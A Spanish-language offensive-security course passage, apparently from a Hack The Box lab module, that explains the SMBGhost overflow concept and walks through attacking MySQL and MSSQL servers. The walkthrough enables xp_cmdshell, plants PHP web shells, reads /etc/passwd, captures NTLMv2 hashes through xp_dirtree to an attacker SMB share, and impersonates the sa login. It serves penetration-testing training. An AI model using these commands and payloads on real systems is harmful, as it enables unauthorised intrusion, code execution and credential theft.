No discutiremos la vulnerabilidad en detalle en esta sección, ya que una explicación muy detallada requiere cierta experiencia en ingeniería inversa y conocimiento avanzado de CPU, kernel y desarrollo de exploits. En cambio, solo nos centraremos en el concepto de ataque porque incluso con exploits y vulnerabilidades más complicadas, el concepto sigue siendo el mismo.

---

## El Concepto del Ataque

En términos simples, esto es un [desbordamiento de entero](https://en.wikipedia.org/wiki/Integer_overflow) vulnerabilidad en una función de un controlador SMB que permite sobrescribir los comandos del sistema al acceder a la memoria. Un desbordamiento de enteros resulta de una CPU que intenta generar un número mayor que el valor requerido para el espacio de memoria asignado. Las operaciones aritméticas siempre pueden devolver valores inesperados, lo que resulta en un error. Un ejemplo de un desbordamiento de enteros puede ocurrir cuando un programador no permite que ocurra un número negativo. En este caso, se produce un desbordamiento de enteros cuando una variable realiza una operación que da como resultado un número negativo, y la variable se devuelve como un entero positivo. Esta vulnerabilidad se produjo porque, en ese momento, la función carecía de controles de límites para manejar el tamaño de los datos enviados en el proceso de negociación de la sesión SMB.

Para obtener más información sobre las técnicas y vulnerabilidades de desbordamiento de búfer, consulte el [Desbordamientos de Búfer Basados en Pila en Linux x86](https://academy.hackthebox.com/course/preview/stack-based-buffer-overflows-on-linux-x86), y [Desbordamientos de Búfer Basados en Pila en Windows x86](https://academy.hackthebox.com/course/preview/stack-based-buffer-overflows-on-windows-x86) módulo. Estos entran en detalle sobre los conceptos básicos de cómo el atacante puede sobrescribir y manejar el búfer.

#### El Concepto de Ataques

![](https://academy.hackthebox.com/storage/modules/116/attack_concept2.png)

La vulnerabilidad ocurre mientras se procesa un mensaje comprimido malformado después del `Negotiate Protocol Responses`. Si el servidor SMB permite solicitudes (sobre TCP/445), la compresión es generalmente compatible, donde el servidor y el cliente establecen los términos de comunicación antes de que el cliente envíe más datos. Supongamos que los datos transmitidos exceden los límites de variables enteras debido a la cantidad excesiva de datos. En ese caso, estas partes se escriben en el búfer, lo que conduce a la sobrescritura de las instrucciones posteriores de la CPU e interrumpe la ejecución normal o planificada del proceso. Estos conjuntos de datos se pueden estructurar para que las instrucciones sobrescritas se reemplacen por las nuestras, y así forzamos a la CPU (y por lo tanto también al proceso) a realizar otras tareas e instrucciones.

#### Iniciación del Ataque

|**Paso**|**SMBGhost**|**Concepto de Ataques - Categoría**|
|---|---|---|
|`1.`|El cliente envía una solicitud manipulada por el atacante al servidor SMB.|`Source`|
|`2.`|Los paquetes comprimidos enviados se procesan de acuerdo con las respuestas de protocolo negociadas.|`Process`|
|`3.`|Este proceso se realiza con los privilegios del sistema o al menos con los privilegios de un administrador.|`Privileges`|
|`4.`|El proceso local se utiliza como destino, que debe procesar estos paquetes comprimidos.|`Destination`|

Esto es cuando el ciclo comienza de nuevo, pero esta vez para obtener acceso remoto al sistema de destino.

#### Ejecución Remota de Código de Disparador

|**Paso**|**SMBGhost**|**Concepto de Ataques - Categoría**|
|---|---|---|
|`5.`|Las fuentes utilizadas en el segundo ciclo son del proceso anterior.|`Source`|
|`6.`|En este proceso, el desbordamiento de enteros se produce reemplazando el búfer sobrescrito con las instrucciones del atacante y obligando a la CPU a ejecutar esas instrucciones.|`Process`|
|`7.`|Se utilizan los mismos privilegios del servidor SMB.|`Privileges`|
|`8.`|El sistema atacante remoto se utiliza como destino, en este caso, otorgando acceso al sistema local.|`Destination`|

Sin embargo, a pesar de la complejidad de la vulnerabilidad debido a la manipulación del búfer, que podemos ver en el [PoC](https://www.exploit-db.com/exploits/48537), sin embargo, el concepto del ataque se aplica aquí.


# Atacar bases de datos SQL

---

[MySQL](https://www.mysql.com/) y [Microsoft SQL Server](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) son [base de datos relacional](https://en.wikipedia.org/wiki/Relational_database) sistemas de gestión que almacenan datos en tablas, columnas y filas. Muchos sistemas de bases de datos relacionales como MSSQL y MySQL usan el [Lenguaje de Consulta Estructurada](https://en.wikipedia.org/wiki/SQL) (`SQL`) para consultar y mantener la base de datos.

Los hosts de bases de datos se consideran objetivos altos, ya que son responsables de almacenar todo tipo de datos confidenciales, incluidas, entre otras, las credenciales de usuario `Personal Identifiable Information (PII)`, datos relacionados con el negocio e información de pago. Además, esos servicios a menudo están configurados con usuarios altamente privilegiados. Si obtenemos acceso a una base de datos, es posible que podamos aprovechar esos privilegios para más acciones, incluido el movimiento lateral y la escalada de privilegios.

---

## Enumeración

De forma predeterminada, MSSQL utiliza puertos `TCP/1433` y `UDP/1434`, y usos de MySQL `TCP/3306`. Sin embargo, cuando MSSQL opera en un modo "oculto", utiliza el `TCP/2433` puerto. Podemos usar `Nmap`son scripts predeterminados `-sC` opción para enumerar los servicios de base de datos en un sistema de destino:

#### Banner Agarrando

  Atacar bases de datos SQL

```shell-session
vcrdcr@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
Nmap scan report for 10.10.10.125
Host is up (0.0099s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-08-26T01:04:36
|_Not valid after:  2051-08-26T01:04:36
|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.

Host script results:
|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

El escaneo Nmap revela información esencial sobre el objetivo, como la versión y el nombre de host, que podemos usar para identificar configuraciones erróneas comunes, ataques específicos o vulnerabilidades conocidas. Exploremos algunas configuraciones erróneas comunes y ataques específicos de protocolo.

---

## Mecanismos de Autenticación

`MSSQL` admite dos [modos de autenticación](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), lo que significa que los usuarios se pueden crear en Windows o SQL Server:

|**Tipo de Autenticación**|**Descripción**|
|---|---|
|`Windows authentication mode`|Este es el valor predeterminado, a menudo denominado `integrated` seguridad porque el modelo de seguridad de SQL Server está estrechamente integrado con Windows/Active Directory. Se confía en las cuentas específicas de usuario y grupo de Windows para iniciar sesión en SQL Server. Los usuarios de Windows que ya han sido autenticados no tienen que presentar credenciales adicionales.|
|`Mixed mode`|El modo mixto admite la autenticación mediante cuentas de Windows/Active Directory y SQL Server. Los pares de nombre de usuario y contraseña se mantienen dentro de SQL Server.|

`MySQL` también admite diferentes [métodos de autenticación](https://dev.mysql.com/doc/internals/en/authentication-method.html), como nombre de usuario y contraseña, así como autenticación de Windows (se requiere un complemento). Además, los administradores pueden [elija un modo de autenticación](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode) por muchas razones, incluyendo compatibilidad, seguridad, usabilidad y más. Sin embargo, dependiendo del método que se implemente, pueden producirse configuraciones erróneas.

En el pasado, había una vulnerabilidad [CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass) en `MySQL 5.6.x` servidores, entre otros, que nos permitieron eludir la autenticación utilizando repetidamente la misma contraseña incorrecta para la cuenta dada porque el `timing attack` la vulnerabilidad existía en la forma en que MySQL manejaba los intentos de autenticación.

En este ataque de tiempo, MySQL intenta repetidamente autenticarse en un servidor y mide el tiempo que tarda el servidor en responder a cada intento. Al medir el tiempo que tarda el servidor en responder, podemos determinar cuándo se ha encontrado la contraseña correcta, incluso si el servidor no indica el éxito o el fracaso.

En el caso de `MySQL 5.6.x`, el servidor tarda más en responder a una contraseña incorrecta que a una correcta. Por lo tanto, si intentamos autenticar repetidamente con la misma contraseña incorrecta, eventualmente recibiremos una respuesta que indica que se encontró la contraseña correcta, aunque no lo fue.

#### Configuraciones erróneas

La autenticación mal configurada en SQL Server puede permitirnos acceder al servicio sin credenciales si el acceso anónimo está habilitado, si un usuario sin contraseña está configurado o si cualquier usuario, grupo o máquina puede acceder a SQL Server.

#### Privilegios

Dependiendo de los privilegios del usuario, es posible que podamos realizar diferentes acciones dentro de un servidor SQL, como:

- Leer o cambiar el contenido de una base de datos
    
- Lea o cambie la configuración del servidor
    
- Ejecutar comandos
    
- Lea archivos locales
    
- Comunicarse con otras bases de datos
    
- Captura el hash del sistema local
    
- Hacerse pasar por usuarios existentes
    
- Obtenga acceso a otras redes
    

En esta sección, exploraremos algunos de estos ataques.

---

## Ataques Específicos del Protocolo

Es crucial entender cómo funciona la sintaxis SQL. Podemos usar lo gratis [Fundamentos de inyección SQL](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals) módulo para presentarnos a la sintaxis SQL. Aunque este módulo cubre MySQL, la sintaxis MSSQL y MySQL son bastante similares.

#### Leer/Cambiar la Base de Datos

Imaginemos que obtuvimos acceso a una base de datos SQL. Primero, necesitamos identificar las bases de datos existentes en el servidor, qué tablas contiene la base de datos y, finalmente, el contenido de cada tabla. Tenga en cuenta que podemos encontrar bases de datos con cientos de tablas. Si nuestro objetivo no es solo obtener acceso a los datos, tendremos que elegir qué tablas pueden contener información interesante para continuar nuestros ataques, como nombres de usuario y contraseñas, tokens, configuraciones y más. Veamos cómo podemos hacer esto:

#### MySQL - Conexión al SQL Server

  Atacar bases de datos SQL

```shell-session
vcrdcr@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13

Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

#### Sqlcmd - Conexión al SQL Server

  Atacar bases de datos SQL

```cmd-session
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1>
```

**Nota:** Cuando nos autenticamos en MSSQL usando `sqlcmd` podemos usar los parámetros `-y` (SQLCMDMAXVARTYPEWIDTH) y `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) para una salida más atractiva. Tenga en cuenta que puede afectar el rendimiento.

Si estamos apuntando `MSSQL` desde Linux, podemos usar `sqsh` como alternativa a `sqlcmd`:

  Atacar bases de datos SQL

```shell-session
vcrdcr@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

Alternativamente, podemos usar la herramienta de Impacket con el nombre `mssqlclient.py`.

  Atacar bases de datos SQL

```shell-session
vcrdcr@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: MyPassword!

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

**Nota:** Cuando nos autenticamos en MSSQL usando `sqsh` podemos usar los parámetros `-h` para desactivar encabezados y pies de página para una apariencia más limpia.

Al usar la autenticación de Windows, debemos especificar el nombre de dominio o el nombre de host de la máquina de destino. Si no especificamos un dominio o nombre de host, asumirá la autenticación SQL y se autenticará contra los usuarios creados en SQL Server. En cambio, si definimos el dominio o el nombre de host, usará la autenticación de Windows. Si estamos apuntando a una cuenta local, podemos usar `SERVERNAME\\accountname` o `.\\accountname`. El comando completo se vería como:

  Atacar bases de datos SQL

```shell-session
vcrdcr@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

#### bases de datos predeterminadas de SQL

Antes de explorar el uso de la sintaxis SQL, es esencial conocer las bases de datos predeterminadas `MySQL` y `MSSQL`. Esas bases de datos contienen información sobre la base de datos en sí y nos ayudan a enumerar nombres de bases de datos, tablas, columnas, etc. Con el acceso a esas bases de datos, podemos usar algunos procedimientos almacenados del sistema, pero generalmente no contienen datos de la empresa.

**Nota:** Obtendremos un error si intentamos enumerar o conectarnos a una base de datos a la que no tenemos permisos.

`MySQL`esquemas/bases de datos predeterminados del sistema:

- `mysql`es la base de datos del sistema que contiene tablas que almacenan la información requerida por el servidor MySQL
- `information_schema`- proporciona acceso a los metadatos de la base de datos
- `performance_schema`es una característica para monitorear la ejecución de MySQL Server en un nivel bajo
- `sys`un conjunto de objetos que ayuda a los DBA y desarrolladores a interpretar los datos recopilados por el Esquema de rendimiento

`MSSQL`esquemas/bases de datos predeterminados del sistema:

- `master`- mantiene la información para una instancia de SQL Server.
- `msdb`- utilizado por SQL Server Agent.
- `model`- una base de datos de plantillas copiada para cada nueva base de datos.
- `resource`una base de datos de solo lectura que mantiene los objetos del sistema visibles en cada base de datos del servidor en el esquema sys.
- `tempdb`- mantiene objetos temporales para consultas SQL.

#### Sintaxis SQL

#### Mostrar Bases de Datos

  Atacar bases de datos SQL

```shell-session
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)
```

Si usamos `sqlcmd`, tendremos que usar `GO` después de nuestra consulta para ejecutar la sintaxis SQL.

  Atacar bases de datos SQL

```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
```

#### Seleccione una base de datos

  Atacar bases de datos SQL

```shell-session
mysql> USE htbusers;

Database changed
```

  Atacar bases de datos SQL

```cmd-session
1> USE htbusers
2> GO

Changed database context to 'htbusers'.
```

#### Mostrar Tablas

  Atacar bases de datos SQL

```shell-session
mysql> SHOW TABLES;

+----------------------------+
| Tables_in_htbusers         |
+----------------------------+
| actions                    |
| permissions                |
| permissions_roles          |
| permissions_users          |
| roles                      |
| roles_users                |
| settings                   |
| users                      |
+----------------------------+
8 rows in set (0.00 sec)
```

  Atacar bases de datos SQL

```cmd-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

table_name
--------------------------------
actions
permissions
permissions_roles
permissions_users
roles      
roles_users
settings
users 
(8 rows affected)
```

#### Seleccione todos los datos de la Tabla "usuarios"

  Atacar bases de datos SQL

```shell-session
mysql> SELECT * FROM users;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```

  Atacar bases de datos SQL

```cmd-session
1> SELECT * FROM users
2> go

id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
          3 john                 john123!         2020-07-02 11:47:16.000
          4 tom                  tom123!          2020-07-02 12:23:16.000

(4 rows affected)
```

---

## Ejecutar Comandos

`Command execution`es una de las capacidades más deseadas a la hora de atacar servicios comunes porque nos permite controlar el sistema operativo. Si tenemos los privilegios apropiados, podemos usar la base de datos SQL para ejecutar comandos del sistema o crear los elementos necesarios para hacerlo.

`MSSQL` tiene un [procedimientos almacenados extendidos](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) llamado [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) lo que nos permite ejecutar comandos del sistema utilizando SQL. Tenga en cuenta lo siguiente sobre `xp_cmdshell`:

- `xp_cmdshell` es una característica potente y está deshabilitada de forma predeterminada. `xp_cmdshell` se puede habilitar y deshabilitar utilizando el [Gestión Basada en Políticas](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) o ejecutando [sp_configurar](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- El proceso de Windows generado por `xp_cmdshell` tiene los mismos derechos de seguridad que la cuenta de servicio de SQL Server
- `xp_cmdshell`funciona sincrónicamente. El control no se devuelve a la persona que llama hasta que se completa el comando command-shell

Para ejecutar comandos utilizando la sintaxis SQL en MSSQL, use:

#### XP_CMDSHELL

  Atacar bases de datos SQL

```cmd-session
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

Si `xp_cmdshell` no está habilitado, podemos habilitarlo, si tenemos los privilegios apropiados, usando el siguiente comando:

Código: mssql

```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

Hay otros métodos para obtener la ejecución de comandos, como agregar [procedimientos almacenados extendidos](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [ensambles CLR](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [Trabajos de Agente de SQL Server](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), y [scripts externos](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). Sin embargo, además de esos métodos, también hay funcionalidades adicionales que se pueden usar como el `xp_regwrite` comando que se utiliza para elevar privilegios mediante la creación de nuevas entradas en el registro de Windows. Sin embargo, esos métodos están fuera del alcance de este módulo.

`MySQL` apoyos [Funciones Definidas por el Usuario](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) lo que nos permite ejecutar código C/C++ como una función dentro de SQL, hay una Función Definida por el Usuario para la ejecución de comandos en esto [Repositorio gitHub](https://github.com/mysqludf/lib_mysqludf_sys). No es común encontrar una función definida por el usuario como esta en un entorno de producción, pero debemos ser conscientes de que podemos usarla.

---

## Escribir Archivos Locales

`MySQL` no tiene un procedimiento almacenado como `xp_cmdshell`, pero podemos lograr la ejecución de comandos si escribimos en una ubicación en el sistema de archivos que puede ejecutar nuestros comandos. Por ejemplo, supongamos `MySQL` opera en un servidor web basado en PHP u otros lenguajes de programación como ASP.NET. Si tenemos los privilegios apropiados, podemos intentar escribir un archivo usando [SELECCIONAR EN EL ARCHIVO DE SALIDA](https://mariadb.com/kb/en/select-into-outfile/) en el directorio del servidor web. Luego podemos navegar a la ubicación donde se encuentra el archivo y ejecutar nuestros comandos.

#### MySQL - Escribir Archivo Local

  Atacar bases de datos SQL

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

En `MySQL`, una variable del sistema global [seguro_archivo_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limita el efecto de las operaciones de importación y exportación de datos, como las realizadas por el `LOAD DATA` y `SELECT … INTO OUTFILE` declaraciones y el [LOAD_ARCHIVO()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) función. Estas operaciones están permitidas solo a los usuarios que tienen el [ARCHIVO](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilegio.

`secure_file_priv`puede establecerse de la siguiente manera:

- Si está vacía, la variable no tiene efecto, lo que no es una configuración segura.
- Si se establece en el nombre de un directorio, el servidor limita las operaciones de importación y exportación para que funcionen únicamente con los archivos de ese directorio. El directorio debe existir; el servidor no lo crea.
- Si se establece en NULL, el servidor deshabilita las operaciones de importación y exportación.

En el siguiente ejemplo, podemos ver el `secure_file_priv` la variable está vacía, lo que significa que podemos leer y escribir datos usando `MySQL`:

#### MySQL - Privilegios de Archivos Seguros

  Atacar bases de datos SQL

```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

Para escribir archivos usando `MSSQL`, necesitamos habilitar [Procedimientos de Automatización de Ole](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), que requiere privilegios de administrador, y luego ejecutar algunos procedimientos almacenados para crear el archivo:

#### MSSQL - Habilitar procedimientos de automatización de Ole

  Atacar bases de datos SQL

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

#### MSSQL - Crear un archivo

  Atacar bases de datos SQL

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

---

## Leer Archivos Locales

Por defecto, `MSSQL` permite la lectura de archivos en cualquier archivo del sistema operativo al que la cuenta tenga acceso de lectura. Podemos utilizar la siguiente consulta SQL:

#### Lea Archivos Locales en MSSQL

  Atacar bases de datos SQL

```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

Como mencionamos anteriormente, por defecto a `MySQL` la instalación no permite la lectura arbitraria de archivos, pero si la configuración correcta está en su lugar y con los privilegios apropiados, podemos leer archivos utilizando los siguientes métodos:

#### MySQL - Leer Archivos Locales en MySQL

  Atacar bases de datos SQL

```shell-session
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>
```

---

## Captura MSSQL Service Hash

En el `Attacking SMB` sección, discutimos que podríamos crear un servidor SMB falso para robar un hash y abusar de alguna implementación predeterminada dentro de un sistema operativo Windows. También podemos robar el hash de la cuenta de servicio MSSQL usando `xp_subdirs` o `xp_dirtree` procedimientos almacenados indocumentados, que utilizan el protocolo SMB para recuperar una lista de directorios secundarios en un directorio principal especificado del sistema de archivos. Cuando usamos uno de estos procedimientos almacenados y lo señalamos a nuestro servidor SMB, la funcionalidad de escucha de directorios obligará al servidor a autenticar y enviar el hash NTLMv2 de la cuenta de servicio que ejecuta SQL Server.

Para que esto funcione, primero tenemos que empezar [Respondedor](https://github.com/lgandx/Responder) o [pulpaket-smbserver](https://github.com/SecureAuthCorp/impacket) y ejecute una de las siguientes consultas SQL:

#### XP_DIRTREE Hash Robando

  Atacar bases de datos SQL

```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```

#### XP_SUBDIRS Hash Robo

  Atacar bases de datos SQL

```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```

Si la cuenta de servicio tiene acceso a nuestro servidor, obtendremos su hash. Luego podemos intentar descifrar el hash o transmitirlo a otro host.

#### XP_SUBDIRS Hash Robando con Respondedor

  Atacar bases de datos SQL

```shell-session
vcrdcr@htb[/htb]$ sudo responder -I tun0

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
```

#### XP_SUBDIRS Hash Robando con impacket

  Atacar bases de datos SQL

```shell-session
vcrdcr@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed                                                 
[*] Config file parsed                                                 
[*] Config file parsed
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
[*] Closing down connection (10.129.203.7,49728)                      
[*] Remaining connections []
```

---

## Hacerse pasar por Usuarios Existentes con MSSQL

SQL Server tiene un permiso especial, llamado `IMPERSONATE`ésto permite al usuario en ejecución asumir los permisos de otro usuario o iniciar sesión hasta que se restablezca el contexto o finalice la sesión. Exploremos cómo el `IMPERSONATE` el privilegio puede conducir a una escalada de privilegios en SQL Server.

Primero, necesitamos identificar a los usuarios a los que podemos suplantar. Los sysadmins pueden hacerse pasar por cualquier persona de forma predeterminada, pero para los usuarios no administradores, los privilegios deben asignarse explícitamente. Podemos utilizar la siguiente consulta para identificar a los usuarios que podemos suplantar:

#### Identificar Usuarios que Podemos Hacerse pasar

  Atacar bases de datos SQL

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

Para tener una idea de las posibilidades de escalado de privilegios, verifiquemos si nuestro usuario actual tiene el rol sysadmin:

#### Verificar nuestro Usuario Actual y Papel

  Atacar bases de datos SQL

```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

Como el valor devuelto `0` indica, no tenemos el rol sysadmin, pero podemos hacerse pasar por el `sa` usuario. Hagamos de suplantar al usuario y ejecutemos los mismos comandos. Para hacerse pasar por un usuario, podemos usar la instrucción Transact-SQL `EXECUTE AS LOGIN` y configúrelo al usuario que queremos suplantar.

#### Hacerse pasar por el usuario de SA

  Atacar bases de datos SQL

```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

